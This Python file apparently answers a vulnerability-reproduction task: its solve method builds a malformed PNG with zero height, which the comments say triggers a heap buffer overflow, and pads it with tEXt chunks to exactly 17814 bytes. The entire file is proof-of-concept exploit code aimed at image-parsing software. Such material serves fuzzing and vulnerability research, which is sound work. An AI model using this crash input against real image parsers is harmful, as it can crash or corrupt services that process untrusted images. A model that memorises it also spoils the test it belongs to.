import struct
import zlib
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PNG with zero height to trigger heap buffer overflow
        # PNG structure: signature + IHDR + IDAT + IEND
        # Set height = 0, width = 1, bit depth = 8, color type = 2 (RGB)
        
        # PNG signature
        png_signature = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk: width=1, height=0
        ihdr_data = struct.pack('>IIBBBBB', 1, 0, 8, 2, 0, 0, 0)  # width, height, bit depth, color type, compression, filter, interlace
        ihdr_chunk = b'IHDR' + ihdr_data
        ihdr_crc = struct.pack('>I', zlib.crc32(ihdr_chunk) & 0xffffffff)
        ihdr = struct.pack('>I', len(ihdr_data)) + ihdr_chunk + ihdr_crc
        
        # IDAT chunk with minimal compressed data
        # For 0x0 image, we still need valid zlib stream
        raw_data = b''  # No pixel data since height=0
        compressed = zlib.compress(raw_data)
        idat_chunk = b'IDAT' + compressed
        idat_crc = struct.pack('>I', zlib.crc32(idat_chunk) & 0xffffffff)
        idat = struct.pack('>I', len(compressed)) + idat_chunk + idat_crc
        
        # IEND chunk
        iend_chunk = b'IEND'
        iend_crc = struct.pack('>I', zlib.crc32(iend_chunk) & 0xffffffff)
        iend = struct.pack('>I', 0) + iend_chunk + iend_crc
        
        # Combine all parts
        poc = png_signature + ihdr + idat + iend
        
        # Pad to target length if needed (17814 bytes)
        target_length = 17814
        if len(poc) < target_length:
            # Add padding in a PNG-compliant way using tEXt chunks
            remaining = target_length - len(poc)
            while remaining > 0:
                # Create tEXt chunk with comment
                chunk_size = min(remaining - 12, 8192)  # Leave room for chunk header/footer
                if chunk_size <= 0:
                    break
                
                # tEXt format: keyword + null + text
                keyword = b'Comment'
                text = b'A' * (chunk_size - len(keyword) - 1)
                text_data = keyword + b'\x00' + text
                
                text_chunk = b'tEXt' + text_data
                text_crc = struct.pack('>I', zlib.crc32(text_chunk) & 0xffffffff)
                text_full = struct.pack('>I', len(text_data)) + text_chunk + text_crc
                
                # Insert before IEND
                poc = poc[:-12] + text_full + poc[-12:]
                remaining = target_length - len(poc)
        
        return poc
